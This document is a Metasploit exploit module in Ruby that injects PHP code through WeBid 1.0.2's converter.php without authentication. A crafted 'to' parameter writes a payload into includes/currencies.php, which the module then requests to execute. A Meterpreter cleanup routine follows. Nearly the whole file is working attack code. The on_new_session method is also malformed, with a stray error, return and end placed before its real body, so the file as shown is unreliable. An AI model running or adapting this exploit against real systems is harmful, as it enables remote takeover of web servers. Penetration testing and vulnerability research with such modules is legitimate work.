# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;WeBid converter.php Remote PHP Code Injection&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a vulnerability found in WeBid version 1.0.2.
        By abusing the converter.php file, a malicious user can inject PHP code
        in the includes/currencies.php script without any authentication, which
        results in arbitrary code execution.
      },
      &#039;Author&#039;         => [
        &#039;EgiX&#039;, # Vulnerability Discovery, PoC
        &#039;juan vazquez&#039; # Metasploit module
      ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;OSVDB&#039;, &#039;73609&#039; ],
          [ &#039;EDB&#039;, &#039;17487&#039; ]
        ],
      &#039;Version&#039;        => &#039;$Revision: $&#039;,
      &#039;Privileged&#039;     => false,
      &#039;Platform&#039;       => [&#039;php&#039;],
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Payload&#039;        =>
        {
        },
      &#039;DisclosureDate&#039; => &#039;Jul 05 2011&#039;,
      &#039;Targets&#039;        =>
        [
          [ &#039;WeBid 1.0.2 / Ubuntu&#039;, {} ]
        ],
      &#039;DefaultTarget&#039; => 0
      ))

      register_options(
        [
          OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to WeBid&#039;, &#039;/WeBid&#039;])
        ], self.class
      )

  end

  def check
    uri = target_uri.path
    uri << &#039;/&#039; if uri[-1,1] != &#039;/&#039;

    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => uri + "docs/changes.txt"
    })

    if res and res.code == 200 and res.body =~ /1\.0\.2 \- 17\/01\/11/
      return Exploit::CheckCode::Appears
    end

    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => uri + "converter.php"
    })

    if res and res.code == 200 and res.body =~ /WeBId.*CURRENCY CONVERTER/
      return Exploit::CheckCode::Detected
    end

    return Exploit::CheckCode::Safe

  end

  def on_new_session(client)

      print_error("The currencies.php won&#039;t be restored automatically.")
      return
    end

    # stdapi must be loaded before we can use fs.file
    client.core.use("stdapi") if not client.ext.aliases.include?("stdapi")

    # Original currencies.php file
    currencies_php = <<-eof
      <?php
      $conversionarray[] = &#039;1265375103&#039;;
      $conversionarray[] = array(
        array(&#039;from&#039; => &#039;GBP&#039;, &#039;to&#039; => &#039;AED&#039;, &#039;rate&#039; => &#039;&#039;)
      );
      ?>
    eof
    currencies_php = currencies_php.gsub(/^\t\t\t/, &#039;&#039;)

    pwd = client.fs.dir.pwd
    print_status("Searching currencies.php file from #{pwd}")

    res = client.fs.file.search(nil, "currencies.php", true, -1)
    res.each do |hit|
      filename = "#{hit[&#039;path&#039;]}/#{hit[&#039;name&#039;]}"
      print_status("Restoring #{filename}")
      client.fs.file.rm(filename)
      fd = client.fs.file.new(filename, "wb")
      fd.write(currencies_php)
      fd.close
    end

    print_status("Cleanup finished")

  end

  def exploit

    uri = target_uri.path
    uri << &#039;/&#039; if uri[-1,1] != &#039;/&#039;
    peer = "#{rhost}:#{rport}"

    stub = "\0&#039;));#{payload.encoded}?>"

    print_status("#{peer} - Injecting the PHP payload")

    response = send_request_cgi({
      &#039;uri&#039; => uri + "converter.php",
      &#039;method&#039; => "POST",
      &#039;vars_post&#039; => {
        "action" => "convert",
        "from" => "USD",
        "to" => stub
      }
    })

    if response and response.code != 200
      print_error("Server returned non-200 status code (#{response.code})")
      return
    end

    print_status("#{peer} - Executing the PHP payload")

    timeout = 0.01
    response = send_request_cgi({
        &#039;uri&#039; => uri + "includes/currencies.php",
        &#039;method&#039; => "GET",
        &#039;headers&#039; => {
            &#039;Connection&#039; => "close",
          }
        }, timeout)

    if response and response.code != 200
      print_error("Server returned non-200 status code (#{response.code})")
    end

    handler
  end
end



